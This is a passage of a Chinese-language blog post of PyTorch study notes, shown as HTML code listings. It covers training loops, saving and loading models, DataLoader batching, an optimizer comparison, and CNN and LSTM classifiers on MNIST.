概率，根据这种形式计算误差</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> range(<span class="number">100</span>):  <span class="comment"># 100步训练</span></span><br><span class="line">    out = net(x)  <span class="comment"># 输出预测值</span></span><br><span class="line"></span><br><span class="line">    loss = loss_func(out, y)  <span class="comment"># 计算误差和真实的差</span></span><br><span class="line"></span><br><span class="line">    optimizer.zero_grad()  <span class="comment"># 将所有参数的梯度降为0</span></span><br><span class="line">    loss.backward()  <span class="comment"># 反向传递，计算参数更新值</span></span><br><span class="line">    optimizer.step()  <span class="comment"># 以lr优化</span></span><br></pre></td></tr></table></figure>



<h1 id="快速搭建法"><a href="#快速搭建法" class="headerlink" title="快速搭建法"></a>快速搭建法</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">net2=torch.nn.Sequential(</span><br><span class="line">    torch.nn.Linear(<span class="number">2</span>,<span class="number">10</span>),</span><br><span class="line">    torch.nn.ReLU(), <span class="comment"># 类，搭建效果和class相同</span></span><br><span class="line">    torch.nn.Linear(<span class="number">10</span>,<span class="number">2</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Net(<br>  (hidden): Linear(in_features=2, out_features=10, bias=True)<br>  (predict): Linear(in_features=10, out_features=2, bias=True)<br>)<br>Sequential(<br>  (0): Linear(in_features=2, out_features=10, bias=True)<br>  (1): ReLU()<br>  (2): Linear(in_features=10, out_features=2, bias=True)<br>)</p>
</blockquote>
<h1 id="保存提取"><a href="#保存提取" class="headerlink" title="保存提取"></a>保存提取</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">torch.manual_seed(<span class="number">1</span>)    <span class="comment"># reproducible,使每次的初始化固定</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 假数据</span></span><br><span class="line">x = torch.unsqueeze(torch.linspace(<span class="number">-1</span>, <span class="number">1</span>, <span class="number">100</span>), dim=<span class="number">1</span>)  <span class="comment"># x data (tensor), shape=(100, 1)</span></span><br><span class="line">y = x.pow(<span class="number">2</span>) + <span class="number">0.2</span>*torch.rand(x.size())  <span class="comment"># noisy y data (tensor), shape=(100, 1)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 建网络</span></span><br><span class="line">    net1 = torch.nn.Sequential(</span><br><span class="line">        torch.nn.Linear(<span class="number">1</span>, <span class="number">10</span>),</span><br><span class="line">        torch.nn.ReLU(),</span><br><span class="line">        torch.nn.Linear(<span class="number">10</span>, <span class="number">1</span>)</span><br><span class="line">    )</span><br><span class="line">    optimizer = torch.optim.SGD(net1.parameters(), lr=<span class="number">0.5</span>)</span><br><span class="line">    loss_func = torch.nn.MSELoss()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 训练</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">        prediction = net1(x)</span><br><span class="line">        loss = loss_func(prediction, y)</span><br><span class="line">        optimizer.zero_grad()</span><br><span class="line">        loss.backward()</span><br><span class="line">        optimizer.step()</span><br><span class="line">    torch.save(net1, <span class="string">'net.pkl'</span>)  <span class="comment"># 保存整个网络</span></span><br><span class="line">	torch.save(net1.state_dict(), <span class="string">'net_params.pkl'</span>)   <span class="comment"># 只保存网络中的参数 (速度快, 占内存少)</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restore_net</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># restore entire net1 to net2</span></span><br><span class="line">    net2 = torch.load(<span class="string">'net.pkl'</span>)</span><br><span class="line">    prediction = net2(x)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">restore_params</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 新建 net3</span></span><br><span class="line">    net3 = torch.nn.Sequential(</span><br><span class="line">        torch.nn.Linear(<span class="number">1</span>, <span class="number">10</span>),</span><br><span class="line">        torch.nn.ReLU(),</span><br><span class="line">        torch.nn.Linear(<span class="number">10</span>, <span class="number">1</span>)</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将保存的参数复制到 net3</span></span><br><span class="line">    net3.load_state_dict(torch.load(<span class="string">'net_params.pkl'</span>))</span><br><span class="line">    prediction = net3(x)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 保存 net1 (1. 整个网络, 2. 只有参数)</span></span><br><span class="line">save()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取整个网络</span></span><br><span class="line">restore_net()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取网络参数, 复制到新网络</span></span><br><span class="line">restore_params()</span><br></pre></td></tr></table></figure>

<h1 id="批训练"><a href="#批训练" class="headerlink" title="批训练"></a>批训练</h1><p>dataloader可以迭代地处理数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.utils.data <span class="keyword">as</span> Data</span><br><span class="line">torch.manual_seed(<span class="number">1</span>)    <span class="comment"># reproducible</span></span><br><span class="line"></span><br><span class="line">BATCH_SIZE = <span class="number">8</span>     <span class="comment"># 批训练的数据个数</span></span><br><span class="line"></span><br><span class="line">x = torch.linspace(<span class="number">1</span>, <span class="number">10</span>, <span class="number">10</span>)       <span class="comment"># x data (torch tensor)</span></span><br><span class="line">y = torch.linspace(<span class="number">10</span>, <span class="number">1</span>, <span class="number">10</span>)       <span class="comment"># y data (torch tensor)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 先转换成 torch 能识别的 Dataset</span></span><br><span class="line"><span class="comment"># 训练数据data_tensor,计算误差target_tensor</span></span><br><span class="line">torch_dataset = Data.TensorDataset(x, y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把 dataset 放入 DataLoader</span></span><br><span class="line">loader = Data.DataLoader(</span><br><span class="line">    dataset=torch_dataset,      <span class="comment"># torch TensorDataset format</span></span><br><span class="line">    batch_size=BATCH_SIZE,      <span class="comment"># mini batch size</span></span><br><span class="line">    shuffle=<span class="literal">True</span>,               <span class="comment"># 要不要打乱数据 (打乱比较好)</span></span><br><span class="line">    num_workers=<span class="number">0</span>,              <span class="comment"># 多线程来读数据，0为默认值</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> range(<span class="number">3</span>):   <span class="comment"># 训练所有!整套!数据 3 次</span></span><br><span class="line">    <span class="comment"># 可以设置是否打乱数据 shuffle</span></span><br><span class="line">    <span class="comment"># enumerate 索引</span></span><br><span class="line">    <span class="keyword">for</span> step, (batch_x, batch_y) <span class="keyword">in</span> enumerate(loader):  <span class="comment"># 每一步 loader 释放一小批数据用来学习</span></span><br><span class="line">        <span class="comment"># 假设这里就是你训练的地方...</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 打出来一些数据</span></span><br><span class="line">        print(<span class="string">'Epoch: '</span>, epoch, <span class="string">'| Step: '</span>, step, <span class="string">'| batch x: '</span>,</span><br><span class="line">              batch_x.numpy(), <span class="string">'| batch y: '</span>, batch_y.numpy())</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Epoch:  0 | Step:  0 | batch x:  [ 5.  7. 10.  3.  4.  2.  1.  8.] | batch y:  [ 6.  4.  1.  8.  7.  9. 10.  3.]<br>Epoch:  0 | Step:  1 | batch x:  [9. 6.] | batch y:  [2. 5.]<br>Epoch:  1 | Step:  0 | batch x:  [ 4.  6.  7. 10.  8.  5.  3.  2.] | batch y:  [7. 5. 4. 1. 3. 6. 8. 9.]<br>Epoch:  1 | Step:  1 | batch x:  [1. 9.] | batch y:  [10.  2.]<br>Epoch:  2 | Step:  0 | batch x:  [ 4.  2.  5.  6. 10.  3.  9.  1.] | batch y:  [ 7.  9.  6.  5.  1.  8.  2. 10.]<br>Epoch:  2 | Step:  1 | batch x:  [8. 7.] | batch y:  [3. 4.]</p>
</blockquote>
<h1 id="优化器optimizer"><a href="#优化器optimizer" class="headerlink" title="优化器optimizer"></a>优化器optimizer</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.utils.data <span class="keyword">as</span> Data</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">torch.manual_seed(<span class="number">1</span>)  <span class="comment"># reproducible</span></span><br><span class="line"></span><br><span class="line">LR = <span class="number">0.01</span></span><br><span class="line">BATCH_SIZE = <span class="number">32</span></span><br><span class="line">EPOCH = <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake dataset</span></span><br><span class="line">x = torch.unsqueeze(torch.linspace(<span class="number">-1</span>, <span class="number">1</span>, <span class="number">1000</span>), dim=<span class="number">1</span>)</span><br><span class="line">y = x.pow(<span class="number">2</span>) + <span class="number">0.1</span> * torch.normal(torch.zeros(*x.size()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># plot dataset</span></span><br><span class="line">plt.scatter(x.numpy(), y.numpy())</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用上节内容提到的 data loader</span></span><br><span class="line">torch_dataset = Data.TensorDataset(x, y)</span><br><span class="line">loader = Data.DataLoader(dataset=torch_dataset, batch_size=BATCH_SIZE, shuffle=<span class="literal">True</span>, num_workers=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认的 network 形式</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Net</span><span class="params">(torch.nn.Module)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        super(Net, self).__init__()</span><br><span class="line">        self.hidden = torch.nn.Linear(<span class="number">1</span>, <span class="number">20</span>)  <span class="comment"># hidden layer</span></span><br><span class="line">        self.predict = torch.nn.Linear(<span class="number">20</span>, <span class="number">1</span>)  <span class="comment"># output layer</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        x = F.relu(self.hidden(x))  <span class="comment"># activation function for hidden layer</span></span><br><span class="line">        x = self.predict(x)  <span class="comment"># linear output</span></span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 为每个优化器创建一个 net</span></span><br><span class="line">net_SGD = Net()</span><br><span class="line">net_Momentum = Net()</span><br><span class="line">net_RMSprop = Net()</span><br><span class="line">net_Adam = Net()</span><br><span class="line">nets = [net_SGD, net_Momentum, net_RMSprop, net_Adam]</span><br><span class="line"></span><br><span class="line"><span class="comment"># different optimizers</span></span><br><span class="line">opt_SGD = torch.optim.SGD(net_SGD.parameters(), lr=LR)</span><br><span class="line">opt_Momentum = torch.optim.SGD(net_Momentum.parameters(), lr=LR, momentum=<span class="number">0.8</span>)</span><br><span class="line">opt_RMSprop = torch.optim.RMSprop(net_RMSprop.parameters(), lr=LR, alpha=<span class="number">0.9</span>)</span><br><span class="line">opt_Adam = torch.optim.Adam(net_Adam.parameters(), lr=LR, betas=(<span class="number">0.9</span>, <span class="number">0.99</span>))</span><br><span class="line">optimizers = [opt_SGD, opt_Momentum, opt_RMSprop, opt_Adam]</span><br><span class="line"></span><br><span class="line">loss_func = torch.nn.MSELoss()</span><br><span class="line">losses_his = [[], [], [], []]  <span class="comment"># 记录 training 时不同神经网络的 loss</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> range(EPOCH):  <span class="comment"># EPOCH=12</span></span><br><span class="line">    print(<span class="string">'Epoch: '</span>, epoch)</span><br><span class="line">    <span class="keyword">for</span> step, (b_x, b_y) <span class="keyword">in</span> enumerate(loader):</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 对每个优化器, 优化属于他的神经网络</span></span><br><span class="line">        <span class="keyword">for</span> net, opt, l_his <span class="keyword">in</span> zip(nets, optimizers, losses_his):  <span class="comment"># 后者都是list形式</span></span><br><span class="line">            output = net(b_x)  <span class="comment"># get output for every net</span></span><br><span class="line">            loss = loss_func(output, b_y)  <span class="comment"># compute loss for every net</span></span><br><span class="line">            opt.zero_grad()  <span class="comment"># clear gradients for next train</span></span><br><span class="line">            loss.backward()  <span class="comment"># backpropagation, compute gradients</span></span><br><span class="line">            opt.step()  <span class="comment"># apply gradients</span></span><br><span class="line">            l_his.append(loss.data.numpy())  <span class="comment"># loss recoder</span></span><br></pre></td></tr></table></figure>

<h1 id="CNN"><a href="#CNN" class="headerlink" title="CNN"></a>CNN</h1><p>收集一小块的图像信息，进行总结</p>
<p>mnist</p>
<p>mnist数据集放在root下的<code>\MNIST\processed</code>文件夹下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.utils.data <span class="keyword">as</span> Data</span><br><span class="line"><span class="keyword">import</span> torchvision  <span class="comment"># 数据库模块</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Hyper Parameters</span></span><br><span class="line">EPOCH = <span class="number">1</span>  <span class="comment"># 训练整批数据多少次, 为了节约时间, 我们只训练一次</span></span><br><span class="line">BATCH_SIZE = <span class="number">50</span></span><br><span class="line">LR = <span class="number">0.001</span>  <span class="comment"># 学习率</span></span><br><span class="line">DOWNLOAD_MNIST = <span class="literal">False</span>  <span class="comment"># 如果你已经下载好了mnist数据就写上 False</span></span><br><span class="line"></span><br><span class="line">train_data_ = torchvision.datasets.MNIST(</span><br><span class="line">    root=<span class="string">'./mnist'</span>,</span><br><span class="line">    train=<span class="literal">True</span>,</span><br><span class="line">    transform=torchvision.transforms.ToTensor(),  <span class="comment"># np array(pixel)修改为tensor （0，255）-&gt;（0，1）</span></span><br><span class="line">    download=DOWNLOAD_MNIST</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 可以打印出数字图片</span></span><br><span class="line">plt.imshow(train_data_.train_data[<span class="number">1</span>].numpy(), cmap=<span class="string">"gray"</span>)</span><br><span class="line">plt.show()</span><br><span class="line">print(train_data_)</span><br><span class="line">print(train_data_.train_data)</span><br></pre></td></tr></table></figure>



<h2 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.utils.data <span class="keyword">as</span> Data</span><br><span class="line"><span class="keyword">import</span> torchvision  <span class="comment"># 数据库模块</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Hyper Parameters</span></span><br><span class="line">EPOCH = <span class="number">1</span>  <span class="comment"># 训练整批数据多少次, 为了节约时间, 我们只训练一次</span></span><br><span class="line">BATCH_SIZE = <span class="number">50</span></span><br><span class="line">LR = <span class="number">0.001</span>  <span class="comment"># 学习率</span></span><br><span class="line">DOWNLOAD_MNIST = <span class="literal">False</span>  <span class="comment"># 如果你已经下载好了mnist数据就写上 False</span></span><br><span class="line"></span><br><span class="line">train_data_ = torchvision.datasets.MNIST(</span><br><span class="line">    root=<span class="string">'./mnist'</span>,</span><br><span class="line">    train=<span class="literal">True</span>,</span><br><span class="line">    transform=torchvision.transforms.ToTensor(),  <span class="comment"># np array(pixel)修改为tensor （0，255）-&gt;（0，1）</span></span><br><span class="line">    download=DOWNLOAD_MNIST</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">test_data_ = torchvision.datasets.MNIST(root=<span class="string">'./mnist'</span>, train=<span class="literal">False</span>)</span><br><span class="line">train_loader = Data.DataLoader(dataset=train_data_, batch_size=BATCH_SIZE, shuffle=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为简化训练，只训练2000组</span></span><br><span class="line"><span class="comment"># 将整数转换成小数，再除以255</span></span><br><span class="line">test_x = torch.unsqueeze(test_data_.test_data, dim=<span class="number">1</span>).type(torch.FloatTensor)[:<span class="number">2000</span>] / <span class="number">255</span></span><br><span class="line">test_y = test_data_.test_labels[:<span class="number">2000</span>]</span><br></pre></td></tr></table></figure>

<h2 id="CNN模型搭建"><a href="#CNN模型搭建" class="headerlink" title="CNN模型搭建"></a>CNN模型搭建</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># CNN模型</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CNN</span><span class="params">(nn.Module)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        super(CNN, self).__init__()</span><br><span class="line">        self.conv1 = nn.Sequential(</span><br><span class="line">            <span class="comment"># (1,28,28)</span></span><br><span class="line">            nn.Conv2d(  <span class="comment"># 卷积层，filter（深度）☞在这一区域内提取出的特征个数</span></span><br><span class="line">                in_channels=<span class="number">1</span>,  <span class="comment"># 输入层高度，黑白1，彩色3</span></span><br><span class="line">                out_channels=<span class="number">16</span>,  <span class="comment"># filter个数，每块提取出16个特征</span></span><br><span class="line">                kernel_size=<span class="number">5</span>,  <span class="comment"># filter宽和高都是5pixel 5x5，每次扫描25个像素点</span></span><br><span class="line">                stride=<span class="number">1</span>,  <span class="comment"># 每步跳1个pixel，步长</span></span><br><span class="line">                padding=<span class="number">2</span>,  <span class="comment"># 边框，提取边缘像素点特征</span></span><br><span class="line">                <span class="comment"># 如果想要 con2d 出来的图片长宽没有变化, padding=(kernel_size-1)/2 当 stride=1</span></span><br><span class="line">                <span class="comment"># output shape (16, 28, 28)</span></span><br><span class="line">            ),</span><br><span class="line">            nn.ReLU(),  <span class="comment"># 非线性激活层 # (16, 28, 28)</span></span><br><span class="line">            nn.MaxPool2d(  <span class="comment"># 池化层，筛选重要的特征</span></span><br><span class="line">                kernel_size=<span class="number">2</span>,  <span class="comment"># 长和宽为2的pooling，可以理解为提取2x2空间种的最大值，用于压缩长宽，但是高度不变</span></span><br><span class="line">            )  <span class="comment"># (16, 14, 14)</span></span><br><span class="line">        )</span><br><span class="line">        self.conv2 = nn.Sequential(  <span class="comment"># (16, 14, 14)</span></span><br><span class="line">            nn.Conv2d(<span class="number">16</span>,  <span class="comment"># input, conv1 outchannel=16</span></span><br><span class="line">                      <span class="number">32</span>,</span><br><span class="line">                      <span class="number">5</span>,  <span class="comment"># kernel_size</span></span><br><span class="line">                      <span class="number">1</span>,</span><br><span class="line">                      <span class="number">2</span>, ),  <span class="comment"># (32, 14, 14)</span></span><br><span class="line">            nn.ReLU(),</span><br><span class="line">            nn.MaxPool2d(<span class="number">2</span>),  <span class="comment"># (32, 7, 7)</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        self.out = nn.Linear(<span class="number">32</span> * <span class="number">7</span> * <span class="number">7</span>, <span class="number">10</span>)  <span class="comment"># 输入，输出</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span><span class="params">(self, x)</span>:</span>  <span class="comment"># x表示输入的training数据</span></span><br><span class="line">        x = self.conv1(x)</span><br><span class="line">        x = self.conv2(x)  <span class="comment"># （batch，32，7，7）</span></span><br><span class="line">        x = x.view(x.size(<span class="number">0</span>), <span class="number">-1</span>)  <span class="comment"># 展平 -1把数据编程32*7*7  (batch,32*7*7)</span></span><br><span class="line">        output = self.out(x)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line">cnn=CNN()</span><br><span class="line">print(cnn)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>CNN(<br>  (conv1): Sequential(<br>    (0): Conv2d(1, 16, kernel_size=(5, 5), stride=(1, 1), padding=(2, 2))<br>    (1): ReLU()<br>    (2): MaxPool2d(kernel_size=2, stride=2, padding=0, dilation=1, ceil_mode=False)<br>  )<br>  (conv2): Sequential(<br>    (0): Conv2d(16, 32, kernel_size=(5, 5), stride=(1, 1), padding=(2, 2))<br>    (1): ReLU()<br>    (2): MaxPool2d(kernel_size=2, stride=2, padding=0, dilation=1, ceil_mode=False)<br>  )<br>  (out): Linear(in_features=1568, out_features=10, bias=True)<br>)</p>
</blockquote>
<h2 id="训练"><a href="#训练" class="headerlink" title="训练"></a>训练</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">optimizer = torch.optim.Adam(cnn.parameters(), lr=LR)   <span class="comment"># optimize all cnn parameters</span></span><br><span class="line">loss_func = nn.CrossEntropyLoss()   <span class="comment"># the target label is not one-hotted</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># training and testing</span></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> range(EPOCH):</span><br><span class="line">    <span class="keyword">for</span> step, (b_x, b_y) <span class="keyword">in</span> enumerate(train_loader):   <span class="comment"># 分配 batch data, normalize x when iterate train_loader</span></span><br><span class="line">        output = cnn(b_x)               <span class="comment"># cnn output</span></span><br><span class="line">        loss = loss_func(output, b_y)   <span class="comment"># cross entropy loss</span></span><br><span class="line">        optimizer.zero_grad()           <span class="comment"># clear gradients for this training step</span></span><br><span class="line">        loss.backward()                 <span class="comment"># backpropagation, compute gradients</span></span><br><span class="line">        optimizer.step()                <span class="comment"># apply gradients</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> step%<span class="number">50</span>==<span class="number">0</span>: </span><br><span class="line">            test_output=cnn(test_x)</span><br><span class="line">            pred_y=torch.max(test_output,<span class="number">1</span>)[<span class="number">1</span>].data.squeeze()</span><br><span class="line">            accuracy=float(sum(pred_y==test_y))/test_y.size(<span class="number">0</span>)</span><br><span class="line">            print(<span class="string">'Epoch:'</span>,epoch,<span class="string">'| train loss %.4f'</span> % loss.data,<span class="string">'| test accuracy: %.2f'</span>% accuracy)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Epoch: 0 | train loss 2.2979 | test accuracy: 0.13<br>Epoch: 0 | train loss 0.2706 | test accuracy: 0.84<br>Epoch: 0 | train loss 0.2919 | test accuracy: 0.89<br>Epoch: 0 | train loss 0.1879 | test accuracy: 0.92</p>
<p>……</p>
</blockquote>
<h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test_output = cnn(test_x[:<span class="number">10</span>])</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">torch.max用于分类问题，选取最大的概率</span></span><br><span class="line"><span class="string">torch.max(input,dim)</span></span><br><span class="line"><span class="string">input是softmax函数输出的一个tensor</span></span><br><span class="line"><span class="string">dim是max函数索引的维度0/1，0是每列的最大值，1是每行的最大值</span></span><br><span class="line"><span class="string">函数会返回两个tensor，第一个tensor是每行的最大值；第二个tensor是每行最大值的索引。</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">pred_y = torch.max(test_output, <span class="number">1</span>)[<span class="number">1</span>].data.numpy().squeeze()</span><br><span class="line">print(pred_y, <span class="string">'prediction number'</span>)</span><br><span class="line">print(test_y[:<span class="number">10</span>].numpy(), <span class="string">'real number'</span>)</span><br></pre></td></tr></table></figure>

<h1 id="RNN"><a href="#RNN" class="headerlink" title="RNN"></a>RNN</h1><p>数据间的顺序关联</p>
<h2 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> torch <span class="keyword">import</span> nn</span><br><span class="line"><span class="keyword">import</span> torchvision.datasets <span class="keyword">as</span> dsets</span><br><span class="line"><span class="keyword">import</span> torchvision.transforms <span class="keyword">as</span> transforms</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">torch.manual_seed(<span class="number">1</span>)  <span class="comment"># reproducible</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Hyper Parameters</span></span><br><span class="line">EPOCH = <span class="number">1</span>  <span class="comment"># 训练整批数据多少次, 为了节约时间, 我们只训练一次</span></span><br><span class="line">BATCH_SIZE = <span class="number">64</span></span><br><span class="line">TIME_STEP = <span class="number">28</span>  <span class="comment"># rnn 时间步数 / 图片高度 每28步中的一步读取一行信息</span></span><br><span class="line">INPUT_SIZE = <span class="number">28</span>  <span class="comment"># rnn 每步输入值 / 图片每行像素 一行信息包括28个像素点</span></span><br><span class="line">LR = <span class="number">0.01</span>  <span class="comment"># learning rate</span></span><br><span class="line">DOWNLOAD_MNIST = <span class="literal">True</span>  <span class="comment"># 如果你已经下载好了mnist数据就写上 Fasle</span></span><br><span class="line"></span><br><span class="line">train_data = dsets.MNIST(root=<span class="string">'./mnist'</span>, train=<span class="literal">True</span>, transform=transforms.ToTensor(), download=DOWNLOAD_MNIST)</span><br><span class="line">test_data = dsets.MNIST(root=<span class="string">'./mnist'</span>, train=<span class="literal">False</span>)</span><br><span class="line">train_loader = torch.utils.data.DataLoader(dataset=train_data, batch_size=BATCH_SIZE, shuffle=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">test_x = test_data.data.type(torch.FloatTensor)[:<span class="number">2000</span>] / <span class="number">255</span></span><br><span class="line">test_y = test_data.targets[:<span class="number">2000</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RNN</span><span class="params">(nn.Module)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        super(RNN, self).__init__()</span><br><span class="line"></span><br><span class="line">        self.rnn = nn.LSTM(  <span class="comment"># 使用rnn准确度不高</span></span><br><span class="line">            input_size=INPUT_SIZE,  <span class="comment"># 图片每层的像素点</span></span><br><span class="line">            hidden_size=<span class="number">64</span>,</span><br><span class="line">            batch_first=<span class="literal">True</span>,  <span class="comment"># batch_size是否在第一维度</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        self.out = nn.Linear(<span class="number">64</span>, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        <span class="comment"># x shape (batch, time_step, input_size)</span></span><br><span class="line">        <span class="comment"># r_out shape (batch, time_step, output_size)</span></span><br><span class="line">        <span class="comment"># h_n shape (n_layers, batch, hidden_size)   LSTM 有两个 hidden states, h_n 是分线, h_c 是主线</span></span><br><span class="line">        <span class="comment"># h_c shape (n_layers, batch, hidden_size)</span></span><br><span class="line">        <span class="comment"># None 是否有第一个hidden state</span></span><br><span class="line">        r_out, (h_n, h_c) = self.rnn(x, <span class="literal">None</span>)</span><br><span class="line">        <span class="comment"># 28个output</span></span><br><span class="line">        <span class="comment"># 选最后一个output(读完所有数据)</span></span><br><span class="line">        out = self.out(r_out[:, <span class="number">-1</span>, :])  <span class="comment"># (batch,time step,input)</span></span><br><span class="line">        <span class="comment"># print(r_out)</span></span><br><span class="line">        <span class="keyword">return</span> out</span><br><span class="line">		<span class="comment"># 这里还有点不明白，需要补充别的视频看一下</span></span><br><span class="line"></span><br><span class="line">rnn = RNN()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">optimizer = torch.optim.Adam(rnn.parameters(), lr=LR)  <span class="comment"># optimize all parameters</span></span><br><span class="line">loss_func = nn.CrossEntropyLoss()  <span class="comment"># the target label is not one-hotted</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> epoch <span class="keyword">in</span> range(EPOCH):</span><br><span class="line">    <span class="keyword">for</span> step, (x, b_y) <span class="keyword">in</span> enumerate(train_loader):</span><br><span class="line">        b_x = x.view(<span class="number">-1</span>, <span class="number">28</span>, <span class="number">28</span>)  <span class="comment"># reshape x to (batch,time_step,input_size)</span></span><br><span class="line">        output = rnn(b_x)  <span class="comment"># rnn output</span></span><br><span class="line">        loss = loss_func(output, b_y)  <span class="comment"># cross entropy loss</span></span><br><span class="line">        optimizer.zero_grad()  <span class="comment"># clear gradients for this training step</span></span><br><span class="line">        loss.backward()  <span class="comment"># backpropagation, compute gradients</span></span><br><span class="line">        optimizer.step()  <span class="comment"># apply gradients</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 每50步</span></span><br><span class="line">        <span class="keyword">if</span> step % <span class="number">50</span> == <span class="number">0</span>:</span><br><span class="line">            test_output = rnn(test_x)</span><br><span class="line">            <span class="comment">#torch.max(input,dim) input是softmax函数输出的一个tensor</span></span><br><span class="line">            <span class="comment"># dim是max函数索引的维度0/1，0是每列的最大值，1是每行的最大值</span></span><br><span class="line">            <span class="comment"># 函数会返回两个tensor，第一个tensor是每行的最大值；第二个tensor是每行最大值的索引</span></span><br><span class="line">            pred_y = torch.max(test_output, <span class="number">1</span>)[<span class="number">1</span>].data.squeeze()</span><br><span class="line">            <span class="comment"># torch.size()返回（行，列）</span></span><br><span class="line">            accuracy = float(sum(pred_y == test_y)) / test_y.size(<span class="number">0</span>)</span><br><span class="line">            print(<span class="string">'Epoch:'</span>, epoch, <span class="string">'| train loss %.4f'</span> % loss.data, <span class="string">'| test accuracy: %.2f'</span> % accuracy)</span><br><span class="line"></span><br><span class="line">test_output = 